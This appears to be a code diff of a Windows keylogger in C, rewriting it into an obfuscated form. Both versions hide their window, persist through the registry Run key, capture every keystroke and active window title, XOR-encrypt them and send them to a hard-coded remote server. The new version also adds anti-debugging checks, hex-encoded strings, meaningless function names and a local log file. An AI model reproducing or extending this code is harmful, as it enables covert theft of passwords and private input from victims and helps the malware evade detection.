@@ -1,228 +1,128 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <stdio.h>
-#include <time.h>  
 #include <stdbool.h>
 #include <winreg.h>
 #include <shlobj.h>
+#include <time.h>
 
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "advapi32.lib")
 
-#define SERVER_IP "192.168.1.71" 
-#define SERVER_PORT 8080
-#define RETRY_INTERVAL 10000  // 10 minutes in milliseconds
-#define APP_NAME "WindowsService"
-#define SERVICE_NAME "WindowsService"
-#define ENCRYPTION_KEY "S3cr3tK3y"
+#define A1 0x5F
+#define B2 0x3D
+#define C3 0x2A
+#define D4 0x1E
 
-void install_persistence() {
-    char path[MAX_PATH];
-    HMODULE hModule = GetModuleHandle(NULL);
-    GetModuleFileName(hModule, path, MAX_PATH);
+unsigned char s1[] = {0x72,0x65,0x67,0x73,0x76,0x72,0x33,0x32,0x00};
+unsigned char s2[] = {0x61,0x64,0x76,0x61,0x70,0x69,0x33,0x32,0x00};
+unsigned char s3[] = {0x57,0x69,0x6E,0x64,0x6F,0x77,0x73,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x00};
+unsigned char s4[] = {0x53,0x33,0x63,0x72,0x33,0x74,0x4B,0x33,0x79,0x00};
+unsigned char s5[] = {0x6B,0x65,0x79,0x73,0x74,0x72,0x6F,0x6B,0x65,0x73,0x2E,0x6C,0x6F,0x67,0x00};
 
-    // Registry persistence
-    HKEY hKey;
-    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
-        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueEx(hKey, SERVICE_NAME, 0, REG_SZ, (BYTE*)path, strlen(path)+1);
-        RegCloseKey(hKey);
-    }
+typedef struct { int x; int y; } XY;
+XY f1() { XY r = {A1|B2, C3^D4}; return r; }
+
+void f2() { if (IsDebuggerPresent()) ExitProcess(1); DWORD t=GetTickCount();Sleep(100);if((GetTickCount()-t)<100)ExitProcess(1); }
+void f3() { HWND h=GetConsoleWindow(); if(h)ShowWindow(h,SW_HIDE); }
+
+void f4(char*d,int l){int k=strlen(s4);for(int i=0;i<l;i++)d[i]^=s4[i%k];}
+
+SOCKET f5() {
+    WSADATA w; SOCKET s=INVALID_SOCKET; struct sockaddr_in sv;
+    if(WSAStartup(MAKEWORD(2,2),&w)!=0)return INVALID_SOCKET;
+    if((s=socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET){WSACleanup();return INVALID_SOCKET;}
+    sv.sin_family=AF_INET; sv.sin_port=htons(8080); sv.sin_addr.s_addr=inet_addr("192.168.1.71");
+    if(connect(s,(struct sockaddr*)&sv,sizeof(sv))<0){closesocket(s);WSACleanup();return INVALID_SOCKET;}
+    return s;
 }
 
-// Hide the console window completely
-void HideConsoleWindow() {
-    HWND hwnd = GetConsoleWindow();
-    if (hwnd != NULL) {
-        ShowWindow(hwnd, SW_HIDE);
-    }
-}
+void f6(char*b,size_t z){time_t n;time(&n);struct tm*t=localtime(&n);strftime(b,z,"[%H:%M:%S]",t);}
 
-void GetCurrentTimeString(char *timeStr, int maxLen) {
-    time_t now;
-    time(&now);
-    struct tm tm_info;
-    localtime_s(&tm_info, &now);  // Windows-safe version of localtime()
-    strftime(timeStr, maxLen, "[%H:%M:%S] ", &tm_info);
-}
+char b1[1024*10]={0}; size_t p1=0; char w1[256]={0};
 
-void encryptData(char *data) {
-    int key_len = strlen(ENCRYPTION_KEY);
-    int data_len = strlen(data);
-    for (int i = 0; i < data_len; i++) {
-        data[i] = data[i] ^ ENCRYPTION_KEY[i % key_len];
-    }
-}
-
-SOCKET connectWithRetry() {
-    WSADATA wsa;
-    SOCKET sock = INVALID_SOCKET;
-    struct sockaddr_in server;
-
-    while (1) {
-        // Initialize Winsock for each attempt
-        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
-            Sleep(RETRY_INTERVAL);
-            continue;
-        }
-
-        // Create a socket
-        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
-            WSACleanup();
-            Sleep(RETRY_INTERVAL);
-            continue;
-        }
-
-        server.sin_family = AF_INET;
-        server.sin_port = htons(SERVER_PORT);
-        server.sin_addr.s_addr = inet_addr(SERVER_IP);
-
-        // Try to connect
-        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
-            closesocket(sock);
-            WSACleanup();
-            Sleep(RETRY_INTERVAL);
-            continue;
-        }
-
-        return sock;
-    }
-}
-
-void logActiveWindow(SOCKET sock) {
-    char windowTitle[256];
-    HWND foregroundWindow = GetForegroundWindow();
-
-    if (foregroundWindow) {
-        GetWindowText(foregroundWindow, windowTitle, sizeof(windowTitle));
-
-        static char lastWindowTitle[256] = "";
-        if (strcmp(lastWindowTitle, windowTitle) != 0) {
-            char titleBuffer[512];
-            char timeStr[32] = {0};
-            
-            // Get timestamp and format message
-            GetCurrentTimeString(timeStr, sizeof(timeStr));
-            sprintf(titleBuffer, "\n%s[Window: %s]\n", timeStr, windowTitle);
-            
-            // Encrypt and send
-            char encrypted_data[512];
-            strncpy(encrypted_data, titleBuffer, sizeof(encrypted_data) - 1);
-            encrypted_data[sizeof(encrypted_data) - 1] = '\0';
-            encryptData(encrypted_data);
-            send(sock, encrypted_data, strlen(encrypted_data), 0);
-            
-            strcpy(lastWindowTitle, windowTitle);
+void f7(SOCKET s) {
+    char t[256]={0}; HWND f=GetForegroundWindow();
+    if(f&&GetWindowText(f,t,sizeof(t))){
+        if(strcmp(w1,t)!=0){
+            char b[512]; char ts[32]; f6(ts,sizeof(ts));
+            int l=sprintf(b,"\n%s [Window: %s]\n",ts,t);
+            f4(b,l); send(s,b,l,0); strcpy(w1,t);
         }
     }
 }
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+void f8() {
+    char pt[MAX_PATH];
+    if(GetModuleFileName(NULL,pt,MAX_PATH)){
+        HKEY h; XY xy = f1();
+        if(RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,xy.x,&h)==ERROR_SUCCESS){
+            RegSetValueEx(h,s3,0,REG_SZ,(BYTE*)pt,strlen(pt)+1);
+            RegCloseKey(h);
+        }
+    }
+}
 
-    HideConsoleWindow();
-    SetPriorityClass(GetCurrentProcess(), IDLE_PRIORITY_CLASS);
-    install_persistence();
-    SOCKET sock;
-    static bool keyState[256] = {0};
+void f9(const char*d){FILE*f=fopen(s5,"a");if(f){fputs(d,f);fclose(f);}}
+void f10(const char*d){size_t l=strlen(d);if(p1+l<sizeof(b1)){strcat(b1+p1,d);p1+=l;}f9(d);}
 
-    while (1) {
+void f11(SOCKET s){if(p1>0){f4(b1,p1);send(s,b1,p1,0);memset(b1,0,sizeof(b1));p1=0;}}
 
-        sock = connectWithRetry();
-        
-        while (sock != INVALID_SOCKET) {
-            logActiveWindow(sock);
-
-            for (int key = 8; key <= 190; key++) {
-                if ((GetAsyncKeyState(key) & 0x8000) && !keyState[key]) {
-                    char keyStr[20] = {0};
-
-                    if (key >= 65 && key <= 90) {
-                        sprintf(keyStr, "%c", key + 32); // Convert to lowercase
-                    } else if (key >= 48 && key <= 57) {
-                        sprintf(keyStr, "%c", key); // Numbers
-                    } else {
-                        switch (key) {
-                            case VK_SPACE: strcpy(keyStr, " "); break;
-                            case VK_RETURN: strcpy(keyStr, "[ENTER]\n"); break;
-                            case VK_TAB: strcpy(keyStr, "[TAB]"); break;
-                            case VK_LSHIFT: 
-                            case VK_RSHIFT: 
-                                continue;  // Skip these specific keys
-                            case VK_SHIFT: strcpy(keyStr, "[SHIFT]"); break;
-                            case VK_BACK: strcpy(keyStr, "\b \b"); break;
-                            case VK_ESCAPE: strcpy(keyStr, "[ESC]"); break;
-                            case VK_LCONTROL: 
-                            case VK_RCONTROL: 
-                                continue;  // Skip these specific keys
-                            case VK_CONTROL: strcpy(keyStr, "[CTRL]"); break;
-                            case VK_LWIN: strcpy(keyStr, "[WIN]"); break;
-                            case VK_RWIN: strcpy(keyStr, "[WIN]"); break;
-                            case VK_LMENU:
-                            case VK_RMENU:
-                                continue;  // Skip these specific keys
-                            case VK_MENU: strcpy(keyStr, "[ALT]"); break;
-                            case VK_CAPITAL: strcpy(keyStr, "[CAPSLOCK]"); break;
-                            case VK_DELETE: strcpy(keyStr, "[DELETE]"); break;
-                            case VK_INSERT: strcpy(keyStr, "[INSERT]"); break;
-                            case VK_HOME: strcpy(keyStr, "[HOME]"); break;
-                            case VK_END: strcpy(keyStr, "[END]"); break;
-                            case VK_LEFT: strcpy(keyStr, "[LEFT]"); break;
-                            case VK_RIGHT: strcpy(keyStr, "[RIGHT]"); break; 
-                            case VK_OEM_1: strcpy(keyStr, ";"); break;
-                            case VK_OEM_7 : strcpy(keyStr, "'"); break;
-                            case VK_OEM_COMMA : strcpy(keyStr, ","); break;
-                            case VK_OEM_PERIOD : strcpy(keyStr, "."); break;
-                            case VK_OEM_MINUS : strcpy(keyStr, "-"); break;
-                            case VK_OEM_PLUS : strcpy(keyStr, "+"); break;
-                            case VK_OEM_2 : strcpy(keyStr, "/"); break;
-                            case VK_OEM_3 : strcpy(keyStr, "`"); break;
-                            case VK_OEM_4 : strcpy(keyStr, "["); break;
-                            case VK_OEM_5 : strcpy(keyStr, "\\"); break;
-                            case VK_OEM_6 : strcpy(keyStr, "]"); break;
-                            case VK_OEM_8 : strcpy(keyStr, "~"); break;
-                            case VK_OEM_102 : strcpy(keyStr, "[BACKSLASH]"); break;
-                            case VK_NUMPAD0 : strcpy(keyStr, "0"); break;
-                            case VK_NUMPAD1 : strcpy(keyStr, "1"); break;
-                            case VK_NUMPAD2 : strcpy(keyStr, "2"); break;
-                            case VK_NUMPAD3 : strcpy(keyStr, "3"); break;
-                            case VK_NUMPAD4 : strcpy(keyStr, "4"); break;
-                            case VK_NUMPAD5 : strcpy(keyStr, "5"); break;
-                            case VK_NUMPAD6 : strcpy(keyStr, "6"); break;
-                            case VK_NUMPAD7 : strcpy(keyStr, "7"); break;
-                            case VK_NUMPAD8 : strcpy(keyStr, "8"); break;
-                            case VK_NUMPAD9 : strcpy(keyStr, "9"); break;
-                            default: strcpy(keyStr, "[OTHER]"); break;
-                        }
-                    }
-
-                    // Encrypt and send
-                    char encrypted_data[1024];
-                    strncpy(encrypted_data, keyStr, sizeof(encrypted_data) - 1);
-                    encrypted_data[sizeof(encrypted_data) - 1] = '\0';
-                    encryptData(encrypted_data);
-                    
-                    if (send(sock, encrypted_data, strlen(encrypted_data), 0) == SOCKET_ERROR) {
-                        closesocket(sock);
-                        WSACleanup();
-                        sock = INVALID_SOCKET;
-                        break;
-                    }
-
-                    keyState[key] = true;
+int WINAPI WinMain(HINSTANCE a,HINSTANCE b,LPSTR c,int d) {
+    f2(); f3(); SetPriorityClass(GetCurrentProcess(),64); f8();
+    SOCKET s; bool k[256]={0}; bool ic=0; DWORD lca=0;
+    while(1){
+        for(int i=8;i<=190;i++){
+            if((GetAsyncKeyState(i)&0x8000)&&!k[i]){
+                char ks[20]={0};
+                if(i>=65&&i<=90)sprintf(ks,"%c",i+32);
+                else if(i>=48&&i<=57)sprintf(ks,"%c",i);
+                else switch(i){
+                    case 32:strcpy(ks," ");break;
+                    case 13:strcpy(ks,"[ENTER]\n");break;
+                    case 9:strcpy(ks,"[TAB]");break;
+                    case 16:strcpy(ks,"[SHIFT]");break;
+                    case 8:strcpy(ks,"\b");break;
+                    case 27:strcpy(ks,"[ESC]");break;
+                    case 17:strcpy(ks,"[CTRL]");break;
+                    case 91:case 92:strcpy(ks,"[WIN]");break;
+                    case 18:strcpy(ks,"[ALT]");break;
+                    case 20:strcpy(ks,"[CAPSLOCK]");break;
+                    case 46:strcpy(ks,"[DELETE]");break;
+                    case 45:strcpy(ks,"[INSERT]");break;
+                    case 36:strcpy(ks,"[HOME]");break;
+                    case 35:strcpy(ks,"[END]");break;
+                    case 37:strcpy(ks,"[LEFT]");break;
+                    case 39:strcpy(ks,"[RIGHT]");break;
+                    case 38:strcpy(ks,"[UP]");break;
+                    case 40:strcpy(ks,"[DOWN]");break;
+                    case 186:strcpy(ks,";");break;
+                    case 222:strcpy(ks,"'");break;
+                    case 188:strcpy(ks,",");break;
+                    case 190:strcpy(ks,".");break;
+                    case 189:strcpy(ks,"-");break;
+                    case 187:strcpy(ks,"+");break;
+                    case 191:strcpy(ks,"/");break;
+                    case 192:strcpy(ks,"`");break;
+                    case 219:strcpy(ks,"[");break;
+                    case 220:strcpy(ks,"\\");break;
+                    case 221:strcpy(ks,"]");break;
+                    default:continue;
                 }
-                if (!(GetAsyncKeyState(key) & 0x8000)) {
-                    keyState[key] = false;
-                }
+                f10(ks);
+                if(ic){int l=strlen(ks);f4(ks,l);if(send(s,ks,l,0)==SOCKET_ERROR){closesocket(s);WSACleanup();ic=0;}}
+                k[i]=1;
             }
-            
-            if (sock == INVALID_SOCKET) {
-                break;
-            }
-            
-            Sleep(1);
+            if(!(GetAsyncKeyState(i)&0x8000))k[i]=0;
         }
-
-        Sleep(RETRY_INTERVAL);
+        DWORD n=GetTickCount();
+        if(!ic&&(n-lca>10000)){
+            s=f5();
+            if(s!=INVALID_SOCKET){ic=1;f11(s);f7(s);}
+            lca=n;
+        }
+        else if(ic)f7(s);
+        Sleep(10);
     }
-
     return 0;
 }
